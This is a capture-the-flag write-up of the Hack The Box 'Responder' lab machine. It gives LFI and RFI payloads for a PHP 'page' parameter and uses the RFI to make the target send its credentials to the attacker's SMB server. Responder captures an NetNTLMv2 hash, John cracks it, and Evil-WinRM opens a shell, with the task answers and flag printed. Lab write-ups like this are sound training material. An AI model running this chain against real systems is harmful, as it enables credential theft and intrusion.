- - - 
created : 31-07-2025 

Tags : #veryeasy
- - - 
# Objective

Learn how to start. [Windows](../../../../3%20-%20Tags/Hacking%20Concepts/Windows.md) machine.
# CONNECT

To attack the target machine, you must be on the same network.  
Connect to the Starting Point VPN using one of the following options.

It may take a minute for HTB to recognize your connection.  
If you don't see an update after 2-3 minutes, refresh the page.

I will use OpenVPN, so i download the config file, go in the same directory and execute the following command :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB]
└─$ sudo openvpn starting_point_mdn0x.ovpn 
[sudo] password di mdn0x: 
```

We can start our [Vulnerable Machine](../../../../3%20-%20Tags/Hacking%20Concepts/Vulnerable%20Machine.md).

Now we add the target IP to our /etc/hosts file, so we don't have to remember the [IP address](../../../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) every time :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 0/Meow]
└─$ sudo nano /etc/hosts
```

We add a line with the given IP and a name .
# Task 1

When visiting the web service using the IP address, what is the domain that we are being redirected to?

```bash
  unika.htb
```
# Task 2

Which scripting language is being used on the server to generate webpages?

Let's add the other hostname on the same IP in our /etc/hosts file, then reload the browser page :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Responder]
└─$ cat /etc/hosts             
127.0.0.1       localhost
127.0.1.1       mdn0xKali.homenet.telecomitalia.it      mdn0xKali 
10.129.188.173 crocodile.htb
10.129.124.104 responder.htb unika.htb
```

The answer is [php](../../../../3%20-%20Tags/Programming%20Languages/php.md), you can look at the [Source Code](../../../../3%20-%20Tags/Hacking%20Concepts/Source%20Code.md) to find it out.
# Task 3

What is the name of the URL parameter which is used to load different language versions of the webpage?

We switch language and we have the new URL :

```bash
  http://unika.htb/index.php?page=german.html
```

So the answer is :

```bash
 page
```
# Task 4

Which of the following values for the `page` parameter would be an example of exploiting a [Local File Inclusion (LFI)](../../../../3%20-%20Tags/Hacking%20Concepts/Local%20File%20Inclusion%20(LFI).md) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

```bash
  ../../../../../../../../windows/system32/drivers/etc/hosts
```
# Task 5

Which of the following values for the `page` parameter would be an example of exploiting a [Remote File Inclusion (RFI)](../../../../3%20-%20Tags/Hacking%20Concepts/Remote%20File%20Inclusion%20(RFI).md) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

```bash
  //10.10.14.6/somefile
```
# Task 6

What does NTLM stand for?

```bash
  New Technology LAN Manager
```
# Task 7

Which flag do we use in the Responder utility to specify the network interface?

```bash
  -I
```
# Task 8

There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.

```bash
 John The Ripper
```
# Task 9

What is the password for the administrator user?

We can try the given [Payload](../../../../3%20-%20Tags/Hacking%20Concepts/Payload.md) for [Local File Inclusion (LFI)](../../../../3%20-%20Tags/Hacking%20Concepts/Local%20File%20Inclusion%20(LFI).md) and we see it works :

![Pasted image 20250731182136.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250731182136.png)

## Responder

We can check if Responder captures an event to see if Responder is working correctly, to do this first we can create a file in our directory with [Nano](../../../../3%20-%20Tags/Hacking%20Tools/Nano.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Responder]
└─$ nano test.txt    
```

We press `ctrl+x` then `y` and save with `enter`, we can see the file with `cat`:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Responder]
└─$ cat test.txt  
test
```

Now we open a simple http [Python](../../../../3%20-%20Tags/Programming%20Languages/Python.md) web [Server](../../../../3%20-%20Tags/Hacking%20Concepts/Server.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Responder]
└─$ python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```

And we try to hit the file with the following URL :

```bash
 http://unika.htb/index.php?page=//ATTACK_BOX/test.txt
```

But first we run Responder to capture the password hash ( we identify the IP using the command `ip a |grep + network interface` ).

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Responder]
└─$ sudo responder -I tun0 -w 

[+] Current Session Variables:
    Responder Machine Name     [WIN-KVJ55LLMYNI]
    Responder Domain Name      [E64X.LOCAL]
    Responder DCE-RPC Port     [45209]

[+] Listening for events...                                                                                                                          
```

Now it's listening, we can run the [Payload](../../../../3%20-%20Tags/Hacking%20Concepts/Payload.md) :

```
http://unika.htb/index.php?page=//10.10.14.231/test.txt
```

![Pasted image 20250731192804.png](../../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250731192804.png)

Seems nothing happened but we check Responder and we have the hash :

```bash
[+] Listening for events...                                                                                                                             

[SMB] NTLMv2-SSP Client   : 10.129.124.104
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:1606604bdf328488:CCD39693D2098416988375F397D30BD2:010100000000000080644FEF4C02DC01813CAB584BDE5E6E0000000002000800450036003400580001001E00570049004E002D004B0056004A00350035004C004C004D0059004E00490004003400570049004E002D004B0056004A00350035004C004C004D0059004E0049002E0045003600340058002E004C004F00430041004C000300140045003600340058002E004C004F00430041004C000500140045003600340058002E004C004F00430041004C000700080080644FEF4C02DC010600040002000000080030003000000000000000010000000020000031F33839A97C0FDBEE759F59238A33751D73ECC5064DC27B27124285FB1354A00A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200330031000000000000000000   
```
## John The Ripper

First we need to make a file and paste the passwd hash into it :

```
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Responder]
└─$ nano hash    
     
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Responder]
└─$ cat hash
Administrator::RESPONDER:1606604bdf328488:CCD39693D2098416988375F397D30BD2:010100000000000080644FEF4C02DC01813CAB584BDE5E6E0000000002000800450036003400580001001E00570049004E002D004B0056004A00350035004C004C004D0059004E00490004003400570049004E002D004B0056004A00350035004C004C004D0059004E0049002E0045003600340058002E004C004F00430041004C000300140045003600340058002E004C004F00430041004C000500140045003600340058002E004C004F00430041004C000700080080644FEF4C02DC010600040002000000080030003000000000000000010000000020000031F33839A97C0FDBEE759F59238A33751D73ECC5064DC27B27124285FB1354A00A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200330031000000000000000000 
```

Now we can run [JohnTheRipper](../../../../3%20-%20Tags/Hacking%20Tools/JohnTheRipper.md) to crack it :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Responder]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
badminton        (Administrator)     
1g 0:00:00:00 DONE (2025-07-31 19:35) 100.0g/s 614400p/s 614400c/s 614400C/s 123456..iheartyou
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

```

The password is `badminton`.
# Task 10

We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

This information can be easily found by scanning with Nmap :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Responder]
└─$ nmap -p- unika.htb      
```

The TCP port it listens on is `5985`
#  Submit Flag

Submit root flag

Let’s proceed with the flag hunt by utilizing [Evil-WinRM](../../../../3%20-%20Tags/Hacking%20Tools/Evil-WinRM.md), a package that includes [Windows](../../../../3%20-%20Tags/Hacking%20Concepts/Windows.md) Remote Management for accessing the target computer :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Starting Point/Tier 1/Responder]
└─$ evil-winrm -i 10.129.124.104 -u administrator -p badminton 

Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd ..
*Evil-WinRM* PS C:\Users> dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          3/9/2022   5:35 PM                Administrator
d-----          3/9/2022   5:33 PM                mike
d-r---        10/10/2020  12:37 PM                Public


*Evil-WinRM* PS C:\Users> cd mike
*Evil-WinRM* PS C:\Users\mike> dir


    Directory: C:\Users\mike


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/10/2022   4:51 AM                Desktop


*Evil-WinRM* PS C:\Users\mike> cd Desktop
*Evil-WinRM* PS C:\Users\mike\Desktop> dir


    Directory: C:\Users\mike\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/10/2022   4:50 AM             32 flag.txt


*Evil-WinRM* PS C:\Users\mike\Desktop> type flag.txt
ea81b7afddd03efaa0945333ed147fac
*Evil-WinRM* PS C:\Users\mike\Desktop> 

```

To move between directories and folders, the command `cd` can be used, while the contents of a folder can be listed using `dir`, then `type` to see the flag .